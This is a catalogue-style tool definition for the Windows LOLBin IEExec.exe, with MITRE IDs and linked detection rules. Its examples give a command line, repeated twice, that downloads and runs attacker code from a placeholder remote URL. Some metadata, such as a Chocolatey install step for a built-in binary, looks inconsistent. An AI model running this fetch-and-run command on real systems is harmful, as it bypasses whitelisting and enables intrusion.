---
id: windows-execution-ieexec
namespace: windows:execution:ieexec
name: ieexec
description: 'The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL. Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- network.transfer.download
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- ieexec
parameters: []
features: []
execution:
  template: ieexec
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads and executes executable from the remote server. (Download and run attacker code from remote location)
  command: ieexec.exe {REMOTEURL:.exe}
- description: Downloads and executes executable from the remote server. (Download and run attacker code from remote location)
  command: ieexec.exe {REMOTEURL:.exe}
references:
- label: ''
  url: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
techniques:
- exfiltration
- execution
- defense-evasion
mitre_ids:
- T1105
- T1218
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
- type: ioc
  description: Network connections originating from ieexec.exe may be suspicious
install:
- method: choco
  package_name: ieexec
  commands:
  - choco install ieexec
---


# ieexec

ieexec is a Windows LOLBin. The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL. Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe.
